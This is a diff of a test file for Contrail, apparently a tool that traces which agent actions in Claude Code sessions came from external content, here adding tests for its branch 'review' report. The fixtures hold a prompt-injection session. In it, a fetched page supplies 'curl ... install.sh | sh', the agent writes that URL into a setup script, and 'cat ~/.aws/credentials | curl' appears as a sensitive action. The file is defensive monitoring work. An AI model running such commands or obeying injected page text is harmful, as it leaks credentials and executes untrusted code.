@@ -1,5 +1,5 @@
 import assert from 'node:assert/strict';
-import { mkdtempSync, symlinkSync, writeFileSync } from 'node:fs';
+import { mkdtempSync, readFileSync, statSync, symlinkSync, writeFileSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
 import { before, test } from 'node:test';
@@ -114,7 +114,8 @@ test('trace --tree hangs each action under the call whose output held its value'
   assert.match(r.out, /your prompt p2 {2}"looks good, commit it" {2}\(principal\)\n└── 23 +SHELL +git add -A && git commit/);
   assert.match(r.out, /nothing to trace.*\n└── 18 +SHELL +npm test/);
   const injection = await run(['trace', '--session', '9c1e', '--tree']);
-  assert.match(injection.out, /└── 12 +SHELL +cat ~\/\.aws\/credentials .*← LIKELY ~\/\.aws\/credentials \(line 7\) \(external\)/);
+  assert.match(injection.out, /\n {8}└── 18 +WRITE +scripts\/dev-setup\.sh {2}← LIKELY get\.quickauth\.example\/install\.sh \(line 3\) \(external\)\n/);
+  assert.match(injection.out, /├── 12 +SHELL +cat ~\/\.aws\/credentials .*← LIKELY ~\/\.aws\/credentials \(line 7\) \(external\)/);
   const json = JSON.parse((await run(['trace', '--session', '4f2a', '--tree', '--json'])).out);
   assert.equal(json.forest[0].children[0].children[0].action, 't4');
   const both = await run(['trace', '--tree', '--shell']);
@@ -165,7 +166,7 @@ test('a version 1 database upgrades to the current schema with its rows intact',
 });
 
 test('no report uses causal or accusatory wording of its own', async () => {
-  const views = [['why', 'npm install jwt-decode'], ['why', 'last'], ['why', 'commit', demo.sha.slice(0, 7)], ['risks'], ['trace', '--session', '4f2a'], ['trace', '--session', '9c1e'], ['trace', '--session', '9c1e', '--tree'], ['sessions'], ['find', 'jwt-decode'], ['find', 'nothing-here'], ['blame', 'auth-service/src/session.ts'], ['blame', 'package.json'], ['why', 'auth-service/src/session.ts:4']];
+  const views = [['why', 'npm install jwt-decode'], ['why', 'last'], ['why', 'commit', demo.sha.slice(0, 7)], ['risks'], ['trace', '--session', '4f2a'], ['trace', '--session', '9c1e'], ['trace', '--session', '9c1e', '--tree'], ['sessions'], ['find', 'jwt-decode'], ['find', 'nothing-here'], ['blame', 'auth-service/src/session.ts'], ['blame', 'package.json'], ['why', 'auth-service/src/session.ts:4'], ['review']];
   for (const argv of views) {
     const own = (await run(argv)).out
       .split('\n')
@@ -175,6 +176,11 @@ test('no report uses causal or accusatory wording of its own', async () => {
     for (const word of ['because', 'caused', 'led to', 'decided', 'tainted', 'malicious']) {
       assert.ok(!own.includes(word), `contrail ${argv.join(' ')} says "${word}"`);
     }
+  }
+  // In markdown, recorded text sits only in code spans and <code>; everything else is Contrail's own.
+  const markdown = (await run(['review', '--markdown'])).out.replace(/`[^`\n]*`/g, '').replace(/<code>[^<]*<\/code>/g, '').toLowerCase();
+  for (const word of ['because', 'caused', 'led to', 'decided', 'tainted', 'malicious']) {
+    assert.ok(!markdown.includes(word), `contrail review --markdown says "${word}"`);
   }
 });
 
@@ -299,7 +305,7 @@ test('statusline prints one line for the session Claude Code names on stdin, and
     assert.equal(code, 0);
     return out;
   };
-  assert.equal(await line('{"session_id":"9c1e7b52-80a4-4d3f-b6e2-71f09d4c8a16"}'), 'contrail ▲ 2 from external content · 5 calls\n');
+  assert.equal(await line('{"session_id":"9c1e7b52-80a4-4d3f-b6e2-71f09d4c8a16"}'), 'contrail ▲ 2 from external content · 6 calls\n');
   assert.equal(await line('{"session_id":"4f2a91c7-3d0e-4b8a-9f61-2c7d0a1e5b33"}'), 'contrail △ 1 not named by you · 7 calls\n');
   assert.equal(await line('{"session_id":"not-recorded-yet"}'), 'contrail recording\n');
   assert.equal(await line('not json'), 'contrail\n');
@@ -315,6 +321,69 @@ test('find lists every input that held a value and every call that used it, in o
   assert.deepEqual(json.sessions[0].sightings.map((x: { held?: unknown; used?: { tool: string } }) => (x.held ? 'held' : x.used!.tool)), ['held', 'Bash', 'Edit']);
   assert.match((await run(['find', 'nothing-here'])).out, /in 0 of 2 sessions[\s\S]*no observed source is not the same as no source/);
   assert.equal((await run(['find'])).code, 1);
+});
+
+test('review sums up the branch for its reviewer: external values first, then sensitive actions, then what you did not name', async () => {
+  const r = await run(['review']);
+  assert.equal(r.err, '');
+  assert.match(r.out, /^Review {2}main against origin\/main\n {2}base origin\/main \(default: first found of origin\/HEAD, origin\/main, origin\/master, main, master\) · merge-base [0-9a-f]{7}\n/);
+  assert.match(r.out, /\n {2}1 commit · 5 changed files \(1 not committed\) · 4 with recorded agent changes\n {2}2 sessions · 1 of 1 commits joined to the call that made them\n/);
+  const sections = ['Values from external content in this change', 'Sensitive actions in these sessions', 'Changed without being named in your words', 'Commits', 'Files with recorded agent changes', 'No recorded agent change'];
+  const at = sections.map(h => r.out.indexOf(`\n${h}`));
+  assert.ok(at.every((x, i) => x > 0 && (i === 0 || x > at[i - 1]!)), `sections in order: ${at.join(', ')}`);
+
+  // The injection session's uncommitted script carries a URL from the fetched page.
+  assert.match(r.out, /Values from external content in this change\n {2}▲ get\.quickauth\.example\/install\.sh {2}in scripts\/dev-setup\.sh · Write w6 · session 9c1e7b52 · p1\n {4}LIKELY {3}← WebFetch of docs\.quickauth\.example\/cli\/setup:3 {2}\(external\) {2}\[R3\]\n {13}3│ Install the CLI with: curl -fsSL https:\/\/get\.quickauth\.example\/install\.sh \| sh\n/);
+  assert.match(r.out, /Sensitive actions in these sessions \(3 of 13 tool calls\)\n {2}▲ cat ~\/\.aws\/credentials \| curl/);
+  assert.match(r.out, /△ npm install jwt-decode/);
+  assert.match(r.out, /Changed without being named in your words\n {2}auth-service\/src\/session\.ts +← Edit t5 {2}session 4f2a91c7 · p1\n/);
+  assert.match(r.out, /scripts\/dev-setup\.sh +← Write w6 {2}session 9c1e7b52 · p1\n/);
+  assert.match(r.out, /\n {2}[0-9a-f]{7} {2}"fix\(auth\): refresh tokens before they expire"\n {4}DIRECT {3}made by Bash t7 · session 4f2a91c7 · seq 23 {2}\[R1\]\n {13}turn p2: "looks good, commit it" {3}named by you\n/);
+  assert.match(r.out, /\n {2}package\.json {2}committed in [0-9a-f]{7}\n {4}POSSIBLE Bash t4 npm install jwt-decode · session 4f2a91c7 · seq 12 · expected, not observed {2}\[R7\]\n {13}turn p1: "Users are getting logged out.*" {3}not named by you\n/);
+  assert.match(r.out, /\n {2}scripts\/dev-setup\.sh {2}not committed\n {4}LIKELY {3}Write w6 · session 9c1e7b52 · seq 18 {2}\[R7\]\n {13}turn p1: "Set up the QuickAuth CLI on this machine so I can test logins locally\." {3}not named by you\n {13}LIKELY get\.quickauth\.example\/install\.sh ← WebFetch of docs\.quickauth\.example\/cli\/setup:3 \(external\)\n/);
+  assert.match(r.out, /No recorded agent change \(you, another process, or a session Contrail did not record\)\n {2}UNKNOWN {2}docs\/CHANGELOG\.md {2}committed in [0-9a-f]{7}\n/);
+  assert.match(r.out, /Data provenance from Contrail's local record, not a judgment of this change\. Not observable: the agent's reasons\./);
+  assert.match(r.out, /Blind spots: .*changes made outside recorded Claude Code sessions/);
+});
+
+test('review --json carries the same facts with full ids', async () => {
+  const json = JSON.parse((await run(['review', '--json'])).out);
+  assert.deepEqual(json.counts, { commits: 1, files: 5, agentFiles: 4, sessions: 2, commitsJoined: 1 });
+  assert.equal(json.head.sha, demo.sha);
+  assert.deepEqual(json.commits[0].madeBy, { session: '4f2a91c7-3d0e-4b8a-9f61-2c7d0a1e5b33', action: 't7', grade: 'DIRECT', rule: 'R1', requested: 'NAMED' });
+  assert.deepEqual(json.external.map((x: { action: string; token: string; files: string[]; steps: Array<{ trust: string; line: number }> }) => [x.action, x.token, x.files, x.steps.map(s => [s.trust, s.line])]), [
+    ['w6', 'get.quickauth.example/install.sh', ['scripts/dev-setup.sh'], [['external', 3]]],
+  ]);
+  assert.deepEqual(json.sensitive.map((f: { action: string }) => f.action), ['w4', 'w3', 't4']);
+  assert.deepEqual(json.notNamed, ['auth-service/src/session.ts', 'package-lock.json', 'package.json', 'scripts/dev-setup.sh']);
+  const byPath = new Map(json.files.map((f: { path: string }) => [f.path, f]));
+  assert.equal((byPath.get('docs/CHANGELOG.md') as { grade: string }).grade, 'UNKNOWN');
+  assert.deepEqual((byPath.get('package.json') as { writers: Array<{ action: string; evidence: string; grade: string }> }).writers.map(w => [w.action, w.evidence, w.grade]), [['t4', 'expected', 'POSSIBLE']]);
+});
+
+test('review --markdown is a pull request description: summary first, files folded, provenance not judgment', async () => {
+  const md = (await run(['review', '--markdown'])).out;
+  assert.match(md, /^### Contrail review: `main` against `origin\/main`\n/);
+  assert.match(md, /Data provenance from Contrail's local record of Claude Code sessions, not a judgment of this change\./);
+  assert.match(md, /\*\*1 commit · 5 changed files \(1 not committed\) · 4 with recorded agent changes · 2 sessions · 1 of 1 commits joined to the call that made them\*\*/);
+  assert.match(md, /#### Values from external content in this change\n\n- ▲ `get\.quickauth\.example\/install\.sh` in `scripts\/dev-setup\.sh` · Write `w6` in session `9c1e7b52` · \*\*LIKELY\*\* \[R3\] from `WebFetch of docs\.quickauth\.example\/cli\/setup:3` \(external\)\n {2}<br>line 3: `Install the CLI with/);
+  assert.ok(md.indexOf('#### Values from external content') < md.indexOf('#### Sensitive actions') && md.indexOf('#### Sensitive actions') < md.indexOf('#### Changed without being named'));
+  assert.match(md, /- `[0-9a-f]{7}` `fix\(auth\): refresh tokens before they expire` · \*\*DIRECT\*\* \[R1\] made by Bash `t7` in session `4f2a91c7` · turn p2: `looks good, commit it` · named by you/);
+  assert.equal(md.match(/<details>/g)?.length, 4);
+  assert.equal(md.match(/<\/details>/g)?.length, 4);
+  assert.match(md, /<summary><code>scripts\/dev-setup\.sh<\/code> · LIKELY · Write <code>w6<\/code> · not named by you<\/summary>/);
+  assert.match(md, /Blind spots: model knowledge and reasoning;/);
+  assert.match(md, /nothing was sent anywhere/);
+  assert.doesNotMatch(md, /\x1b/);
+});
+
+test('review -o writes the markdown with private permissions and prints the terminal view', async () => {
+  const path = join(mkdtempSync(join(tmpdir(), 'contrail-review-out-')), 'review.md');
+  const r = await run(['review', '-o', path]);
+  assert.match(r.out, /^Review {2}main against origin\/main/);
+  assert.match(r.out, new RegExp(`Wrote the markdown for a pull request description to ${path.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}\n$`));
+  assert.equal(readFileSync(path, 'utf8'), (await run(['review', '--markdown'])).out);
+  assert.equal(statSync(path).mode & 0o777, 0o600);
 });
 
 test('why shows a directory hint only when it adds a source the full path does not', async () => {
